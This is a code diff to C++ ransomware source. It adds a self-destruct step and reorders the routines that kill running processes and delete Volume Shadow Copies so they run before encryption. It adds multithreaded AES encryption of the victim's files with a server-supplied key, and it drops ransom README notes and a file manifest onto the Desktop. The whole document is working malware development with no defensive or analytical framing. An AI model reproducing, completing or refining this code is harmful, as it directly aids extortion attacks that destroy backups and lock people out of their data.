@@ -42,6 +42,7 @@ int main() {
 
     if (ONLINE_ENC) {
         online_enc();
+        self_destruct();
     }
 
 
@@ -77,6 +78,10 @@ int online_enc() {
         SaveResultsToFile(filePath, files);
     }
 
+    // kill all processes and nuke VSS
+    KillProcs();
+    nuke_vss();
+
 
     // set value for total number of writable files
     std::string filesCount = countNonEmptyLines(filePath);
@@ -92,7 +97,7 @@ int online_enc() {
     if (jsonResponse.contains("message") && jsonResponse["message"] == "success") {
         // Update global variables if respective keys exist
         if (jsonResponse.contains("data")) {
-            OFF_README = DecodeBase64(jsonResponse["data"]);
+            OFF_README = jsonResponse["data"];
         }
         if (jsonResponse.contains("public_key")) {
             PUBLIC_KEY = jsonResponse["public_key"];
@@ -100,9 +105,76 @@ int online_enc() {
     }
     
 
-    // kill all processes and nuke VSS
-    KillProcs();
-    nuke_vss();
+    // read file paths from filePath and save them to a list
+    std::vector<std::wstring> filesToProcess;
+    std::wifstream inFile(filePath);
+    std::wstring line;
+    while (std::getline(inFile, line)) {
+        filesToProcess.push_back(line);
+    }
+    inFile.close();
+
+
+    // Use 32 threads for parallel processing
+    const int maxThreads = std::min<int>(32, static_cast<int>(std::thread::hardware_concurrency()));
+    std::vector<std::map<std::string, std::map<std::string, std::string>>> results(maxThreads);
+    std::mutex resultMutex;
+
+
+    // Use parallelism to process multiple files simultaneously
+    auto processFiles = [&](int tid, int start, int end) {
+        for (int i = start; i < end; ++i) {
+            // 3. Encrypt the file.
+            int requiredSize = WideCharToMultiByte(CP_UTF8, 0, filesToProcess[i].c_str(), -1, NULL, 0, NULL, NULL);
+            std::string narrowFilePath(requiredSize, 0);
+            WideCharToMultiByte(CP_UTF8, 0, filesToProcess[i].c_str(), -1, &narrowFilePath[0], requiredSize, NULL, NULL);
+            narrowFilePath.pop_back(); // Remove the null-terminator
+
+            auto encResult = AESEncrypt(narrowFilePath, PUBLIC_KEY);
+            for (const auto& [key, value] : encResult) {
+                results[tid][key] = value;
+            }
+        }
+    };
+
+    std::vector<std::thread> threads;
+    int blockSize = filesToProcess.size() / maxThreads;
+    for (int t = 0; t < maxThreads; ++t) {
+        int start = t * blockSize;
+        int end = (t == maxThreads - 1) ? filesToProcess.size() : start + blockSize;
+        threads.push_back(std::thread(processFiles, t, start, end));
+    }
+
+    for (auto& t : threads) {
+        t.join();
+    }
+
+
+    // Merge results or dictionaries into one
+    std::map<std::string, std::map<std::string, std::string>> combinedResult;
+    for (const auto& res : results) {
+        for (const auto& [key, value] : res) {
+            combinedResult[key] = value;
+        }
+    }
+
+
+    // Convert combined dictionary to JSON and save them to a random file in Desktop
+    nlohmann::json j = combinedResult;
+    std::filesystem::path desktopPath = getDesktopPath();
+    std::string randomStr = gen_str(8);
+    std::wstring jsonFileName = L"FILES_" + std::wstring(randomStr.begin(), randomStr.end()) + L".json";
+    std::filesystem::path finalJsonPath = desktopPath / jsonFileName;
+
+    std::ofstream jsonFile(finalJsonPath);
+    jsonFile << j.dump(4);
+    jsonFile.close();
+
+
+    // save readme to multiple locations
+    std::string randomReadme = gen_str(8);
+    std::string readmeFileName = "README_" + randomReadme + ".txt";
+    create_readmes(DecodeBase64(OFF_README), readmeFileName);
     
 
     return 0;
@@ -196,11 +268,8 @@ int offline_enc() {
     }
 
 
-    // Convert combined dictionary to JSON and save them to a random file in TEMP
+    // Convert combined dictionary to JSON and save them to a random file in Desktop
     nlohmann::json j = combinedResult;
-
-
-    // 6. Save the JSON to a randomly named file in Desktop
     std::filesystem::path desktopPath = getDesktopPath();
     std::string randomStr = gen_str(8);
     std::wstring jsonFileName = L"FILES_" + std::wstring(randomStr.begin(), randomStr.end()) + L".json";
@@ -216,6 +285,7 @@ int offline_enc() {
     std::string randomReadme = gen_str(8);
     std::string readmeFileName = "README_" + randomReadme + ".txt";
     create_readmes(OFF_README, readmeFileName);
+
 
     return 0;
 }
